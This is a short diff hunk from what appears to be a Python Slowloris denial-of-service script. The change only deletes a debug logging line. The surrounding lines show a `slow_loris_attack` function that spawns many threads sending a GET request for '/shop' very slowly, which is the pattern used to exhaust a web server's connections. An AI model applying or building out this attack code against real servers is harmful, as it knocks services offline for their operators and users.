@@ -26,7 +26,6 @@ logging.debug(f'PORT={PORT}')
 
 def slow_loris_attack():
     get_request = create_simple_get_request("/shop")
-    logging.debug(get_request)
 
     for request_num in range(NUM_REQUESTS_TO_START):
         threading.Thread(target=send_very_slowly, args=(str(request_num), get_request,)).start()
